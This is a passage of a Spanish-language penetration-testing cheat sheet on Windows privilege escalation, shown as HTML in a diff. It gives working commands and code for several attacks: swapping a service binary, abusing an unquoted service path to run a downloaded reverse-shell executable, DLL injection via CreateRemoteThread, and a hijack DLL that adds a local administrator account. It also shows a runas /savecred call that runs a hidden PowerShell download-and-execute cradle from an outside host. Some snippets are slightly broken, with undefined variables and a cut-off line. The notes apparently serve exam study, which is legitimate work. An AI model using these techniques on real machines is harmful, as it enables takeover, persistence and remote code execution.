+<li><code>iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe</code>: Descargamos el binario.</li>
+<li><code>move C:\xampp\mysql\bin\mysqld.exe mysqld.exe</code>: Movemos el binario original.</li>
+<li>
+<p><code>move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe</code>: Movemos el binario que queremos ejecutar.</p>
+</li>
+<li>
+<p>Ahora o reiniciamos el servicio o reiniciamos la maquina.</p>
+</li>
+<li><code>sc stop mysql</code>: Reiniciamos el servicio.</li>
+<li><code>sc start mysql</code>: Reiniciamos el servicio.</li>
+<li>O bien reiniciamos la maquina: <code>shutdown /r /t 0</code></li>
+</ul>
+<hr />
+<h2 id="abusar-de-binario-de-un-servicio-con-un-directorio-con-espacios-y-sin-comillas">Abusar de binario de un servicio con un directorio con espacios y sin comillas<a class="headerlink" href="#abusar-de-binario-de-un-servicio-con-un-directorio-con-espacios-y-sin-comillas" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Muchas veces los servicios tienen un directorio con espacios y no tienen comillas, lo que nos permite abusar de esto.</li>
+<li>Por ejemplo, si tenemos un servicio que tiene un directorio con espacios y no tiene comillas, podemos abusar de esto cambiando el path del servicio.</li>
+</ul>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>  Name             : DevService
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>  DisplayName      : DevService
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>  Description      : 
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>  State            : Stopped
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>  StartMode        : Auto
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>  PathName         : C:\Skylark\Development Binaries 01\???????.exe
+</span></code></pre></div>
+- En este caso podemos cambiar el path del servicio a un binario que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell.
+- <code>curl http://192.168.45.210/rev.exe -o Development.exe</code>
+- <code>sc query DevService</code>
+- <code>sc Start DevService</code>
+- <code>sc config DevService binPath= "C:\Skylark\Development Binaries 01\rev.exe"</code>: OPCIONAL! a veces no es necesario.
+- Y del otro lado tenemos el listener escuchando</p>
+<h2 id="dll-injection">DLL injection<a class="headerlink" href="#dll-injection" title="Permanent link">&para;</a></h2>
+<ul>
+<li>La idea es metemr un trozo de código dentro de un DLL que se carga en un proceso activo.</li>
+<li>Esta tecnica permite ejecutar código en el contexto de un proceso.</li>
+</ul>
+<h3 id="loadlibrary">LoadLibrary<a class="headerlink" href="#loadlibrary" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>LoadLibrary</code> es una función de la API de Windows que carga una DLL en la memoria de un proceso.</li>
+<li>Código C:</li>
+</ul>
+<div class="language-C highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span><span class="c1"> // windows API</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="c1"> // standard I/O</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">    </span><span class="c1">// Using LoadLibrary to load a DLL into the current process</span>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="w">    </span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;example.dll&quot;</span><span class="p">);</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hModule</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to load example.dll</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Successfully loaded example.dll</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-21-12"><a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>
+</span><span id="__span-21-13"><a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-21-14"><a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="p">}</span>
+</span></code></pre></div>
+<h4 id="ejemplo-de-dll-injection">Ejemplo de DLL injection<a class="headerlink" href="#ejemplo-de-dll-injection" title="Permanent link">&para;</a></h4>
+<div class="language-C highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="w">    </span><span class="c1">// Using LoadLibrary for DLL injection</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="w">    </span><span class="c1">// First, we need to get a handle to the target process</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">targetProcessId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">123456</span><span class="w"> </span><span class="c1">// The ID of the target process</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">targetProcessId</span><span class="p">);</span>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hProcess</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to open target process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
+</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="w">    </span><span class="c1">// Next, we need to allocate memory in the target process for the DLL path</span>
+</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">dllPathAddressInRemoteMemory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">dllPath</span><span class="p">),</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">);</span>
+</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dllPathAddressInRemoteMemory</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-17"><a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to allocate memory in target process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-18"><a id="__codelineno-22-18" name="__codelineno-22-18" href="#__codelineno-22-18"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-22-19"><a id="__codelineno-22-19" name="__codelineno-22-19" href="#__codelineno-22-19"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-22-20"><a id="__codelineno-22-20" name="__codelineno-22-20" href="#__codelineno-22-20"></a>
+</span><span id="__span-22-21"><a id="__codelineno-22-21" name="__codelineno-22-21" href="#__codelineno-22-21"></a><span class="w">    </span><span class="c1">// Write the DLL path to the allocated memory in the target process</span>
+</span><span id="__span-22-22"><a id="__codelineno-22-22" name="__codelineno-22-22" href="#__codelineno-22-22"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">succeededWriting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">dllPathAddressInRemoteMemory</span><span class="p">,</span><span class="w"> </span><span class="n">dllPath</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">dllPath</span><span class="p">),</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-22-23"><a id="__codelineno-22-23" name="__codelineno-22-23" href="#__codelineno-22-23"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">succeededWriting</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-24"><a id="__codelineno-22-24" name="__codelineno-22-24" href="#__codelineno-22-24"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to write DLL path to target process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-25"><a id="__codelineno-22-25" name="__codelineno-22-25" href="#__codelineno-22-25"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-22-26"><a id="__codelineno-22-26" name="__codelineno-22-26" href="#__codelineno-22-26"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-22-27"><a id="__codelineno-22-27" name="__codelineno-22-27" href="#__codelineno-22-27"></a>
+</span><span id="__span-22-28"><a id="__codelineno-22-28" name="__codelineno-22-28" href="#__codelineno-22-28"></a><span class="w">    </span><span class="c1">// Get the address of LoadLibrary in kernel32.dll</span>
+</span><span id="__span-22-29"><a id="__codelineno-22-29" name="__codelineno-22-29" href="#__codelineno-22-29"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">loadLibraryAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">&quot;kernel32.dll&quot;</span><span class="p">),</span><span class="w"> </span><span class="s">&quot;LoadLibraryA&quot;</span><span class="p">);</span>
+</span><span id="__span-22-30"><a id="__codelineno-22-30" name="__codelineno-22-30" href="#__codelineno-22-30"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">loadLibraryAddress</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-31"><a id="__codelineno-22-31" name="__codelineno-22-31" href="#__codelineno-22-31"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to get address of LoadLibraryA</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-32"><a id="__codelineno-22-32" name="__codelineno-22-32" href="#__codelineno-22-32"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-22-33"><a id="__codelineno-22-33" name="__codelineno-22-33" href="#__codelineno-22-33"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-22-34"><a id="__codelineno-22-34" name="__codelineno-22-34" href="#__codelineno-22-34"></a>
+</span><span id="__span-22-35"><a id="__codelineno-22-35" name="__codelineno-22-35" href="#__codelineno-22-35"></a><span class="w">    </span><span class="c1">// Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path</span>
+</span><span id="__span-22-36"><a id="__codelineno-22-36" name="__codelineno-22-36" href="#__codelineno-22-36"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hThread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">loadLibraryAddress</span><span class="p">,</span><span class="w"> </span><span class="n">dllPathAddressInRemoteMemory</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-22-37"><a id="__codelineno-22-37" name="__codelineno-22-37" href="#__codelineno-22-37"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hThread</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-22-38"><a id="__codelineno-22-38" name="__codelineno-22-38" href="#__codelineno-22-38"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Failed to create remote thread in target process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-39"><a id="__codelineno-22-39" name="__codelineno-22-39" href="#__codelineno-22-39"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-22-40"><a id="__codelineno-22-40" name="__codelineno-22-40" href="#__codelineno-22-40"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-22-41"><a id="__codelineno-22-41" name="__codelineno-22-41" href="#__codelineno-22-41"></a>
+</span><span id="__span-22-42"><a id="__codelineno-22-42" name="__codelineno-22-42" href="#__codelineno-22-42"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Successfully injected example.dll into target process</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-22-43"><a id="__codelineno-22-43" name="__codelineno-22-43" href="#__codelineno-22-43"></a>
+</span><span id="__span-22-44"><a id="__codelineno-22-44" name="__codelineno-22-44" href="#__codelineno-22-44"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-22-45"><a id="__codelineno-22-45" name="__codelineno-22-45" href="#__codelineno-22-45"></a><span class="p">}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="dll-hijacking">DLL Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h2>
+<ul>
+<li>El concepto es reemplazar un DLL utilizado por un programa por otro DLL que contenga código malicioso para elevar privilegios.</li>
+<li>Hipoteticamente sabemos que el programa carga un DLL que no existe en el sistema, entonces podemos crear un DLL con el mismo nombre y cargarlo en la memoria del proceso.</li>
+<li>O también hipoteticamente sabemos que el programa carga un DLL que existe en el sistema, pero lo reemplazamos por otro DLL que contenga código malicioso.</li>
+</ul>
+<h4 id="ejemplo-de-dll-hijacking">Ejemplo de DLL Hijacking<a class="headerlink" href="#ejemplo-de-dll-hijacking" title="Permanent link">&para;</a></h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1">// Super inyección mega básica del curso OSCP</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c1">// Este código implementa una DLL que realiza una inyección básica al ser cargada en un proceso.</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="c1">// La función DllMain es el punto de entrada de la DLL y ejecuta diferentes acciones dependiendo del motivo de la llamada.</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="c1">// Para compilar en Kali Linux utilizamos mingw64 con el siguiente comando:</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="c1">// x86_64-w64-mingw32-gcc SuperBasicInjection.cpp --shared -o SomeMissingDLL.dll</span>
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="c1">// Para compilar desde Visual Studio, simplemente cree un proyecto de DLL y agregue este archivo fuente.</span>
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="n">BOOL</span><span class="w"> </span><span class="n">APIENTRY</span><span class="w"> </span><span class="n">DllMain</span><span class="p">(</span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hModule</span><span class="p">,</span>
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">  </span><span class="n">ul_reason_for_call</span><span class="p">,</span>
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">lpReserved</span><span class="p">)</span>
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="p">{</span>
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="w">    </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="w">    </span><span class="p">{</span>
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="w">        </span><span class="c1">// Este caso se ejecuta cuando la DLL es cargada en un proceso.</span>
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a><span class="w">        </span><span class="c1">// Aquí se realiza la inyección de código.</span>
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="w">        </span><span class="c1">// En este ejemplo, se crea un usuario local con privilegios de administrador.</span>
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;net user /add test-account test1234&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Crea un usuario llamado &quot;test-account&quot; con contraseña &quot;test1234&quot;.</span>
+</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="w">        </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;net localgroup administrators test-account /add&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// Agrega el usuario al grupo de administradores locales.</span>
+</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_ATTACH</span><span class="p">:</span>
+</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a><span class="w">        </span><span class="c1">// Este caso se ejecuta cuando un nuevo hilo se crea en el proceso que cargó la DLL.</span>
+</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_THREAD_DETACH</span><span class="p">:</span>
+</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a><span class="w">        </span><span class="c1">// Este caso se ejecuta cuando un hilo que usaba la DLL termina.</span>
+</span><span id="__span-23-30"><a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-23-31"><a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a><span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">DLL_PROCESS_DETACH</span><span class="p">:</span>
+</span><span id="__span-23-32"><a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a><span class="w">        </span><span class="c1">// Este caso se ejecuta cuando la DLL es descargada del proceso.</span>
+</span><span id="__span-23-33"><a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-23-34"><a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-23-35"><a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span><span class="w"> </span><span class="c1">// Indica que la DLL se cargó correctamente.</span>
+</span><span id="__span-23-36"><a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a><span class="p">}</span>
+</span></code></pre></div>
+<h2 id="runas-save-creds">runas save creds<a class="headerlink" href="#runas-save-creds" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Detección</strong>: <code>cmdkey /list</code></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">security</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span><span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">Currently</span> <span class="n">stored</span> <span class="n">credentials</span><span class="p">:</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    <span class="n">Target</span><span class="p">:</span> <span class="n">Domain</span><span class="p">:</span><span class="n">interactive</span><span class="p">=</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>                                                       <span class="n">Type</span><span class="p">:</span> <span class="n">Domain</span> <span class="n">Password</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>    <span class="n">User</span><span class="p">:</span> <span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">security</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<ul>
+<li><strong>Explotación</strong>: <code>runas /user:ACCESS\Administrator /savecred "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.58/rev.ps1')"</code><ul>
+<li>También podemos hacer: `runas </li>
+<li><strong>Ejecutar un archivo ejecutable</strong>: <code>runas /user:ACCESS\Administrator /savecred "C:\path\to\executable.exe"</code></li>
+<li><strong>Abrir el símbolo del sistema como administrador</strong>: <code>runas /user:ACCESS\Administrator /savecred "cmd.exe"</code></li>
+<li><strong>Ejecutar un script de PowerShell</strong>: <code>runas /user:ACCESS\Administrator /savecred "powershell.exe -File C:\path\to\script.ps1"</code></li>
+<li><strong>Abrir el Administrador de tareas como administrador</strong>: <code>runas /user:ACCESS\Administrator /savecred "taskmgr.exe"</code></li>
+<li><strong>Ejecutar un programa con argumentos específicos</strong>: <code>runas /user:ACCESS\Administrator /savecred "notepad.exe C:\path\to\file.txt"</code></li>
+<li><strong>Abrir el Editor del Registro</strong>: <code>runas /user:ACCESS\Administrator /savecred "regedit.exe"</code></li>
+<li><strong>Ejecutar un navegador web</strong>: <code>runas /user:ACCESS\Administrator /savecred "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</code></li>
